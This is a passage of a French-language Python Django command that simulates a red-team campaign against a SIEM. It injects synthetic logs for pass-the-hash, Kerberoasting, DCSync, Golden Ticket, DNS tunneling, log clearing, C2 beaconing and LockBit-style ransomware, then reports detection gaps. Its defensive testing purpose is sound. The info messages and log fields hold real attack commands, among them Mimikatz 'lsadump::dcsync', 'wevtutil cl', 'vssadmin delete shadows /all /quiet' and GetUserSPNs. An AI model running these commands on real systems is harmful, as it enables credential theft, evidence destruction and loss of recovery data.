            "ATK-08", "Pass-the-Hash (PtH)", "Lateral Movement", "T1550.002",
            "Mimikatz 2.2.0 + sekurlsa::pth",
            logs_injected=4,
            expected_detection="Détection ML (source IP inconnue) + Wazuh rule 60106",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh (rule 60106) + ML Anomaly (new source IP)",
            severity_obtained="high" if detected else None,
            notes=f"Hash NTLM utilisé depuis {ATTACKER['pivot_ip']} (pas dans whitelist). 3 partages accédés dont Finance$ et Backups$.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-09 : Kerberoasting (T1558.003)
    # ──────────────────────────────────────────────────────────────────────────

    def atk09_kerberoasting(self):
        self.section("ATK-09", "Kerberoasting — Extraction tickets Kerberos TGS", "T1558.003 · Credential Access")
        self.info("Impacket GetUserSPNs.py pour récupérer les TGS des comptes de service")
        self.info("Commande : GetUserSPNs.py techcorp.local/alice.dupont -outputfile hashes.kerberoast")

        before = get_alerts_count_before()

        # Multiples demandes TGS en rafale
        service_accounts = [
            ("svc-backup@techcorp.fr", "MSSQLSvc/srv-db.techcorp.local:1433"),
            ("svc-monitor@techcorp.fr", "HTTP/webserver.techcorp.local:443"),
        ]

        for svc_user, spn in service_accounts:
            for _ in range(5):
                create_log(
                    source_type="wazuh",
                    action="4769",  # Kerberos TGS requested
                    outcome="success",
                    severity="medium",
                    user_email="alice.dupont@techcorp.fr",
                    source_ip=ATTACKER["pivot_ip"],
                    destination_ip=HOSTS["dc01"]["ip"],
                    resource=f"DC01/kerberos",
                    extra_fields={
                        "wazuh_rule_id": "60130",
                        "wazuh_rule_description": "Kerberos TGS Ticket Request",
                        "wazuh_level": 6,
                        "agent_name": "DC01",
                        "event_id": "4769",
                        "service_name": svc_user,
                        "ticket_encryption_type": "0x17",
                        "encryption_type_name": "RC4-HMAC (weak — vulnerable to offline crack)",
                        "spn": spn,
                        "client_address": ATTACKER["pivot_ip"],
                        "failure_code": "0x0",
                    },
                    event_time=self.now - timedelta(minutes=25, seconds=random.randint(0, 120)),
                )

        self.warn("  → 10 demandes TGS en RC4-HMAC (ticket faible, crackable offline)")
        self.warn("  → Comptes ciblés : svc-backup, svc-monitor (comptes de service)")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "kerberos" in (a.title or "").lower() or "tgs" in (a.title or "").lower()
            or "kerberoast" in (a.title or "").lower()
            for a in new_alerts
        )

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.warn("NON détecté — aucune règle Kerberoasting. ML pourrait détecter le volume anormal de TGS.")

        record(
            "ATK-09", "Kerberoasting", "Credential Access", "T1558.003",
            "Impacket GetUserSPNs.py + Hashcat",
            logs_injected=10,
            expected_detection="Aucune règle spécifique — ML anomaly (10 TGS RC4 en rafale)",
            detected=False,
            alert_title=None,
            detection_engine="Aucun (GAP de détection)",
            severity_obtained=None,
            notes="ABSENCE DE RÈGLE Kerberoasting. RC4-HMAC (0x17) est un indicateur clé. Recommandation : ajouter règle threshold sur event 4769 RC4.",
        )
        return False  # expected gap

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-10 : Data Exfiltration DNS Tunneling (T1048.003)
    # ──────────────────────────────────────────────────────────────────────────

    def atk10_dns_exfiltration(self):
        self.section("ATK-10", "DNS Tunneling Exfiltration — iodine/dnscat2", "T1048.003 · Exfiltration")
        self.info("L'attaquant exfiltre les fichiers Finance via DNS tunneling")
        self.info(f"Outil : dnscat2 vers {ATTACKER['exfil_domain']}")

        before = get_alerts_count_before()

        # Volume anormal de requêtes DNS
        for i in range(50):
            subdomain = f"{uuid.uuid4().hex[:32]}.{ATTACKER['exfil_domain']}"
            create_log(
                source_type="syslog",
                action="syslog_kern",
                outcome="success",
                severity="medium",
                source_ip=HOSTS["ws-alice"]["ip"],
                destination_ip="8.8.8.8",
                resource="FortiGate-DNS-Filter",
                extra_fields={
                    "facility": "kern",
                    "message": f"DNS query: {subdomain} TYPE=TXT from {HOSTS['ws-alice']['ip']}",
                    "dns_query": subdomain,
                    "dns_type": "TXT",
                    "query_length": len(subdomain),
                    "suspicious_pattern": "long_subdomain_base64",
                    "tunnel_indicator": True,
                },
                event_time=self.now - timedelta(minutes=35, seconds=i * 3),
            )

        self.warn(f"  → 50 requêtes DNS TXT vers {ATTACKER['exfil_domain']} en 2.5 minutes")
        self.warn("  → Sous-domaines encodés base64 (indicateur de tunneling)")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "dns" in (a.title or "").lower() or "tunnel" in (a.title or "").lower()
            or "exfil" in (a.title or "").lower()
            for a in new_alerts
        )

        record(
            "ATK-10", "DNS Tunneling Exfiltration", "Exfiltration", "T1048.003",
            "dnscat2 + Iodine",
            logs_injected=50,
            expected_detection="Aucune règle spécifique — ML anomaly (volume DNS)",
            detected=False,
            alert_title=None,
            detection_engine="Aucun (GAP de détection critique)",
            severity_obtained=None,
            notes=f"50 requêtes DNS TXT avec sous-domaines longs encodés base64. Domaine {ATTACKER['exfil_domain']}. GAP critique : aucun monitoring DNS.",
        )
        return False

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-11 : Windows Event Log Cleared (T1070.001)
    # ──────────────────────────────────────────────────────────────────────────

    def atk11_log_clearing(self):
        self.section("ATK-11", "Defense Evasion — Suppression journaux Windows", "T1070.001 · Defense Evasion")
        self.info("wevtutil cl Security && wevtutil cl System && wevtutil cl Application")

        before = get_alerts_count_before()

        for log_name in ["Security", "System", "Application", "Microsoft-Windows-Sysmon/Operational"]:
            create_log(
                source_type="wazuh",
                action="1102",
                outcome="success",
                severity="critical",
                user_email="alice.dupont@techcorp.fr",
                source_ip=HOSTS["ws-alice"]["ip"],
                resource=f"EventLog/{log_name}",
                extra_fields={
                    "wazuh_rule_id": "18145",
                    "wazuh_rule_description": f"Windows {log_name} event log cleared",
                    "wazuh_level": 15,
                    "agent_name": "ws-alice",
                    "event_id": "1102",
                    "log_cleared": log_name,
                    "subject_user": "alice.dupont",
                    "command_used": f"wevtutil cl {log_name}",
                    "mitre_technique": "T1070.001",
                },
                event_time=self.now - timedelta(minutes=10, seconds=list(["Security", "System", "Application", "Microsoft-Windows-Sysmon/Operational"]).index(log_name) * 5),
            )
            self.warn(f"  → Event 1102 : Journal '{log_name}' vidé sur ws-alice")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "log" in (a.title or "").lower() or "clear" in (a.title or "").lower()
            or "1102" in (a.title or "") or "alice" in (a.title or "").lower()
            for a in new_alerts
        )

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.warn("Wazuh level 15 devrait créer une alerte critique directement")

        record(
            "ATK-11", "Windows Event Log Clearing", "Defense Evasion", "T1070.001",
            "wevtutil + PowerShell Clear-EventLog",
            logs_injected=4,
            expected_detection="Alerte critique Wazuh rule 18145 (Event 1102, level 15)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh (rule 18145, level 15)",
            severity_obtained="critical",
            notes="4 journaux supprimés : Security, System, Application, Sysmon. Tactique anti-forensics. Wazuh level 15 max.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-12 : DCSync Attack (T1003.006)
    # ──────────────────────────────────────────────────────────────────────────

    def atk12_dcsync(self):
        self.section("ATK-12", "DCSync — Réplication AD pour extraction hashes (Mimikatz)", "T1003.006 · Credential Access")
        self.info("Mimikatz : lsadump::dcsync /domain:techcorp.local /all")
        self.info("Exploite les droits DS-Replication-Get-Changes sur l'AD")

        before = get_alerts_count_before()

        # Event 4662 - Operation performed on AD object (DS-Replication)
        for _ in range(3):
            create_log(
                source_type="wazuh",
                action="4662",
                outcome="success",
                severity="critical",
                user_email="alice.dupont@techcorp.fr",
                source_ip=HOSTS["ws-alice"]["ip"],
                destination_ip=HOSTS["dc01"]["ip"],
                resource="Active Directory",
                extra_fields={
                    "wazuh_rule_id": "60204",
                    "wazuh_rule_description": "DCSync detected - DS-Replication rights used from non-DC",
                    "wazuh_level": 15,
                    "agent_name": "DC01",
                    "event_id": "4662",
                    "object_type": "domainDNS",
                    "accesses": "Control Access",
                    "properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}",
                    "dcsync_guids": [
                        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes
                        "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes-All
                    ],
                    "subject_account": "alice.dupont",
                    "source_ip": HOSTS["ws-alice"]["ip"],
                    "mitre_technique": "T1003.006",
                    "krbtgt_hash_exposed": True,
                },
                event_time=self.now - timedelta(minutes=3, seconds=random.randint(0, 30)),
            )

        self.warn("  → Event 4662 avec GUID DS-Replication-Get-Changes depuis poste non-DC")
        self.warn("  → Tous les hashes NTLM du domaine compromis (y compris krbtgt)")
        self.warn("  → IMPACT MAXIMAL : Golden Ticket possible")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "dcsync" in (a.title or "").lower() or "replication" in (a.title or "").lower()
            or "4662" in (a.title or "") or "alice" in (a.title or "").lower()
            for a in new_alerts
        )

        record(
            "ATK-12", "DCSync Attack", "Credential Access", "T1003.006",
            "Mimikatz lsadump::dcsync",
            logs_injected=3,
            expected_detection="Alerte critique Wazuh rule 60204 (Event 4662 DS-Replication non-DC)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh (rule 60204)",
            severity_obtained="critical",
            notes="GUID DS-Replication utilisé depuis WS non-DC. Hash krbtgt compromis = Golden Ticket = compromission totale du domaine.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-13 : Ransomware Simulation (T1486)
    # ──────────────────────────────────────────────────────────────────────────

    def atk13_ransomware(self):
        self.section("ATK-13", "Ransomware — Chiffrement masse (simulation LockBit 3.0)", "T1486 · Impact")
        self.info("Chiffrement de 2 847 fichiers sur srv-file dans 3 partages")
        self.info("Extension : .lockbit3 — Note de rançon : README-LOCKBIT.txt")

        before = get_alerts_count_before()

        # Wazuh FIM : masse de modifications de fichiers
        create_log(
            source_type="wazuh",
            action="syscheck_file_modified",
            outcome="success",
            severity="critical",
            user_email="alice.dupont@techcorp.fr",
            source_ip=ATTACKER["pivot_ip"],
            destination_ip=HOSTS["srv-file"]["ip"],
            resource="\\\\SRV-FILE\\Finance$",
            extra_fields={
                "wazuh_rule_id": "553",
                "wazuh_rule_description": "Integrity checksum changed — possible ransomware activity",
                "wazuh_level": 15,
                "agent_name": "srv-file",
                "syscheck": {
                    "path": "\\\\SRV-FILE\\Finance$",
                    "event": "modified",
                    "files_affected": 2847,
                    "extensions_modified": [".xlsx", ".docx", ".pdf", ".mdb"],
                    "new_extension": ".lockbit3",
                    "ransom_note_created": "README-LOCKBIT.txt",
                    "encryption_algorithm": "AES-256 + RSA-2048",
                    "time_elapsed_seconds": 142,
                },
                "mitre_technique": "T1486",
                "ransomware_family": "LockBit 3.0",
                "vss_deleted": True,
                "backup_destroyed": True,
            },
            event_time=self.now - timedelta(minutes=1),
        )
        self.warn("  → 2 847 fichiers chiffrés en 142 secondes")
        self.warn("  → Extensions ciblées : .xlsx .docx .pdf .mdb")
        self.warn("  → Note de rançon déposée : README-LOCKBIT.txt")
        self.warn("  → Shadow copies supprimées (vssadmin delete shadows /all)")

        # VSS deletion
        create_log(
            source_type="wazuh",
            action="sysmon_process_creation",
            outcome="success",
            severity="critical",
            user_email="alice.dupont@techcorp.fr",
            source_ip=HOSTS["srv-file"]["ip"],
            resource="srv-file",
            extra_fields={
                "wazuh_rule_id": "92300",
                "wazuh_rule_description": "Shadow copies deleted — anti-recovery technique",
                "wazuh_level": 15,
                "agent_name": "srv-file",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\vssadmin.exe",
                "command_line": "vssadmin delete shadows /all /quiet",
                "mitre_technique": "T1490",
            },
            event_time=self.now - timedelta(seconds=90),
        )
        self.warn("  → vssadmin delete shadows /all — sauvegardes VSS détruites")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "ransomware" in (a.title or "").lower() or "lockbit" in (a.title or "").lower()
            or "syscheck" in (a.title or "").lower() or "chiffr" in (a.title or "").lower()
            or "integrity" in (a.title or "").lower()
            for a in new_alerts
        )

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.warn("Wazuh level 15 sur 553 + 92300 devrait créer des alertes")

        record(
            "ATK-13", "Ransomware (LockBit 3.0 Simulation)", "Impact", "T1486",
            "LockBit 3.0 (simulé) + vssadmin",
            logs_injected=2,
            expected_detection="Wazuh rule 553 (FIM masse) + rule 92300 (VSS deletion), level 15",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh FIM (rule 553) + Sysmon",
            severity_obtained="critical",
            notes="2847 fichiers chiffrés en 142s. VSS supprimées. IMPACT : perte données Finance, RH, Backups. Rançon potentielle.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-14 : Menace IP connue CTI (T1071.001)
    # ──────────────────────────────────────────────────────────────────────────

    def atk14_known_malicious_ip(self):
        self.section("ATK-14", "Threat Intel — Connexion vers IP malveillante connue", "T1071.001 · C2 Communication")
        self.info(f"Connexion HTTP vers {ATTACKER['c2_ip']} (score AbuseIPDB 100/100, catégories: C2/Malware/Scanning)")

        before = get_alerts_count_before()

        # Multiples connexions sortantes vers IP C2 connue
        for i in range(8):
            create_log(
                source_type="syslog",
                action="syslog_kern",
                outcome="success",
                severity="critical",
                source_ip=HOSTS["ws-charlie"]["ip"],
                destination_ip=ATTACKER["c2_ip"],
                resource="FortiGate-FW01",
                extra_fields={
                    "facility": "kern",
                    "message": f"ALLOW TCP {HOSTS['ws-charlie']['ip']}:{50000+i} -> {ATTACKER['c2_ip']}:443",
                    "dst_port": 443,
                    "src_port": 50000 + i,
                    "bytes_sent": 4096 + i * 512,
                    "bytes_received": 8192 + i * 1024,
                    "connection_id": i + 1,
                    "interval_seconds": 30,
                    "c2_beacon_pattern": True,
                },
                event_time=self.now - timedelta(minutes=40, seconds=i * 30),
            )

        self.warn(f"  → 8 connexions HTTPS vers {ATTACKER['c2_ip']} toutes les 30s (pattern C2 beacon)")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "threat" in (a.title or "").lower() or "intel" in (a.title or "").lower()
            or "malicious" in (a.title or "").lower() or ATTACKER["c2_ip"] in (a.title or "")
            for a in new_alerts
        )

        record(
            "ATK-14", "C2 Communication (Known Malicious IP)", "Command and Control", "T1071.001",
            "Cobalt Strike Beacon / Metasploit handler",
            logs_injected=8,
            expected_detection="Alerte Threat Intel (AbuseIPDB score 100) si enrichissement actif",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Threat Intelligence (AbuseIPDB/VirusTotal)",
            severity_obtained="critical" if detected else None,
            notes=f"IP {ATTACKER['c2_ip']} est Tor exit node, AbuseIPDB 100/100. Beacon HTTPS toutes les 30s = C2 actif. CTI enrichissement requis.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-15 : Golden Ticket Attack (T1558.001)
    # ──────────────────────────────────────────────────────────────────────────

    def atk15_golden_ticket(self):
        self.section("ATK-15", "Golden Ticket — Persistance totale post-DCSync", "T1558.001 · Persistence")
        self.info("Mimikatz kerberos::golden /domain:techcorp.local /sid:S-1-5-21-... /krbtgt:<hash> /user:Administrator")
        self.info("Ticket valide 10 ans — accès perpétuel au domaine même après réinitialisation MDP")

        before = get_alerts_count_before()

        # Ticket Kerberos avec durée anormale
        create_log(
            source_type="wazuh",
            action="4768",  # Kerberos TGT requested
            outcome="success",
            severity="critical",
            user_email="Administrator@techcorp.fr",
            source_ip=HOSTS["ws-alice"]["ip"],
            destination_ip=HOSTS["dc01"]["ip"],
            resource="DC01/kerberos",
            extra_fields={
                "wazuh_rule_id": "60131",
                "wazuh_rule_description": "Kerberos TGT with abnormal ticket lifetime",
                "wazuh_level": 15,
                "agent_name": "DC01",
                "event_id": "4768",
                "client_address": HOSTS["ws-alice"]["ip"],
                "ticket_lifetime_hours": 87600,
                "ticket_lifetime_human": "10 ans",
                "client_name": "Administrator",
                "encryption_type": "0x12",
                "golden_ticket_indicators": {
                    "anomalous_lifetime": True,
                    "krbtgt_used": True,
                    "source_non_dc": True,
                },
                "mitre_technique": "T1558.001",
            },
            event_time=self.now - timedelta(minutes=2),
        )
        self.warn("  → TGT demandé avec durée de vie de 10 ans (anormal — normal = 10h)")
        self.warn("  → Indicateur Golden Ticket : krbtgt hash utilisé depuis ws-alice (non-DC)")
        self.warn("  → PERSISTANCE MAXIMALE : accès domaine maintenu même après réinitialisation des mots de passe")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "golden" in (a.title or "").lower() or "ticket" in (a.title or "").lower()
            or "4768" in (a.title or "") or "kerberos" in (a.title or "").lower()
            for a in new_alerts
        )

        record(
            "ATK-15", "Golden Ticket (Kerberos Persistence)", "Persistence", "T1558.001",
            "Mimikatz kerberos::golden",
            logs_injected=1,
            expected_detection="Wazuh rule 60131 (TGT anormal 10 ans)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh (rule 60131)",
            severity_obtained="critical",
            notes="CRITICITÉ MAXIMALE. Ticket 10 ans = persistance indéfinie. Requiert réinitialisation krbtgt 2x pour invalider.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # RAPPORT FINAL
    # ──────────────────────────────────────────────────────────────────────────

    def print_report(self):
        width = 72
        self.log(f"\n\n{'═' * width}")
        self.log(c("bold", c("cyan", "  RAPPORT RED TEAM — LOG+ SIEM DETECTION ASSESSMENT")))
        self.log(c("dim", "  TechCorp S.A.S. | Campagne APT simulée | Classification : CONFIDENTIEL"))
        self.log(f"{'═' * width}")

        detected_count = sum(1 for r in RESULTS if r["detected"])
        missed_count   = sum(1 for r in RESULTS if not r["detected"])
        total          = len(RESULTS)
        coverage       = (detected_count / total * 100) if total else 0

        self.log(f"\n{c('bold', '  RÉSUMÉ EXÉCUTIF')}")
        self.log(f"  Scénarios testés    : {total}")
        self.log(f"  Détectés            : {c('green', str(detected_count))} ✓")
        self.log(f"  Manqués (GAPs)      : {c('red', str(missed_count))} ✗")
        self.log(f"  Taux de couverture  : {c('yellow', f'{coverage:.0f}%')}")

        self.log(f"\n{'─' * width}")
        self.log(f"  {'ID':<8} {'Scénario':<38} {'MITRE':<14} {'Détecté':<10} {'Moteur'}")
        self.log(f"{'─' * width}")

        for r in RESULTS:
            status = c("green", "✓ OUI") if r["detected"] else c("red", "✗ NON")
            engine = r["detection_engine"][:26] if r["detection_engine"] else "—"
            self.log(
                f"  {r['id']:<8} {r['name'][:37]:<38} {r['mitre_technique']:<14} {status:<18} {engine}"
            )

        self.log(f"\n{'─' * width}")

        # GAPs critiques
        gaps = [r for r in RESULTS if not r["detected"]]
        if gaps:
            self.log(f"\n{c('bold', c('red', '  GAPS DE DÉTECTION CRITIQUES'))}")
            for g in gaps:
                self.log(f"\n  {c('red', '▸')} {c('bold', g['id'])} — {g['name']}")
                self.log(f"    MITRE     : {g['mitre_technique']}")
                self.log(f"    Outil     : {g['tool']}")
                self.log(f"    Attendu   : {g['expected_detection']}")
                self.log(f"    Obtenu    : {c('red', 'AUCUNE ALERTE')}")
                self.log(f"    Notes     : {c('dim', g['notes'])}")

        # Recommandations
        self.log(f"\n{'─' * width}")
        self.log(c("bold", c("yellow", "  RECOMMANDATIONS PRIORITAIRES")))
        recs = [
            ("CRITIQUE", "Ajouter règle Kerberoasting (Event 4769 RC4, threshold >5 en 60s)"),
            ("CRITIQUE", "Ajouter monitoring DNS (volume TXT, sous-domaines longs = tunneling)"),
            ("HIGH",     "Intégrer CTI enrichissement automatique pour connexions outbound FW"),
            ("HIGH",     "Règle DCSync : Event 4662 GUID DS-Replication depuis non-DC → alerte immédiate"),
            ("HIGH",     "Règle Golden Ticket : TGT lifetime > 24h → alerte critique"),
            ("MEDIUM",   "Corréler cross-source M365 + Wazuh pour même user (PtH + connexion M365)"),
            ("MEDIUM",   "Dashboard temps réel beaconing C2 (connexions périodiques même IP)"),
            ("LOW",      "Alertes syslog FW pour flux sortants vers pays à risque (RU, CN, KP, IR)"),
        ]
        for level, rec in recs:
            color = "red" if level == "CRITIQUE" else "yellow" if level == "HIGH" else "cyan" if level == "MEDIUM" else "dim"
            self.log(f"  [{c(color, level):>8}] {rec}")

        self.log(f"\n{'═' * width}\n")

        # Export JSON
        return {
            "summary": {
                "total": total,
                "detected": detected_count,
                "missed": missed_count,
                "coverage_pct": round(coverage, 1),
            },
            "results": RESULTS,
        }


# ══════════════════════════════════════════════════════════════════════════════
# COMMANDE DJANGO
# ══════════════════════════════════════════════════════════════════════════════

class Command(BaseCommand):
    help = "Simule une campagne d'attaque red team contre le SIEM Log+"

    def add_arguments(self, parser):
        parser.add_argument(
            "--scenario",
            type=str,
            default="all",
            help="Scénario à exécuter : all | atk01 | atk02 | ... | atk15",
        )
        parser.add_argument(
            "--delay",
            type=float,
            default=0.5,
            help="Délai (secondes) entre scénarios",
        )
        parser.add_argument(
            "--output",
            type=str,
            default=None,
            help="Fichier de sortie JSON pour le rapport",
        )

    def handle(self, *args, **options):
        scenario = options["scenario"].lower()
        delay = options["delay"]
        output = options["output"]

        sim = AttackSimulator(verbose=True)

        sim.banner("LOG+ SIEM — RED TEAM SIMULATION ENGINE v1.0")
        print(c("dim", f"  Target  : TechCorp S.A.S. (PME simulée, 50 employés)"))
        print(c("dim", f"  Assets  : DC01, SRV-FILE, SRV-LINUX + 5 workstations"))
        print(c("dim", f"  Sources : Microsoft 365, Wazuh 4.7, FortiGate FW, Syslog"))
        print(c("dim", f"  Mode    : Simulation (logs injectés directement en base)\n"))

        scenarios = {
            "atk01": sim.atk01_password_spray,
            "atk02": sim.atk02_impossible_travel,
            "atk03": sim.atk03_off_hours_login,
            "atk04": sim.atk04_mfa_fatigue,
            "atk05": sim.atk05_privilege_escalation,
            "atk06": sim.atk06_lsass_dump,
            "atk07": sim.atk07_powershell_encoded,
            "atk08": sim.atk08_pass_the_hash,
            "atk09": sim.atk09_kerberoasting,
            "atk10": sim.atk10_dns_exfiltration,
            "atk11": sim.atk11_log_clearing,
            "atk12": sim.atk12_dcsync,
            "atk13": sim.atk13_ransomware,
            "atk14": sim.atk14_known_malicious_ip,
            "atk15": sim.atk15_golden_ticket,
        }

        to_run = scenarios if scenario == "all" else {scenario: scenarios[scenario]} if scenario in scenarios else {}

        if not to_run:
            self.stderr.write(f"Scénario inconnu : {scenario}. Disponibles : {list(scenarios.keys())}")
            return

        for sid, fn in to_run.items():
            try:
                fn()
            except Exception as e:
                print(c("red", f"  [ERREUR] {sid} : {e}"))
            if delay > 0:
                time.sleep(delay)

        report = sim.print_report()

        if output:
            with open(output, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2, default=str)
            print(c("green", f"  Rapport JSON exporté → {output}"))

        self.stdout.write(self.style.SUCCESS(
            f"\nSimulation terminée — {report['summary']['detected']}/{report['summary']['total']} "
            f"scénarios détectés ({report['summary']['coverage_pct']}%)"
        ))
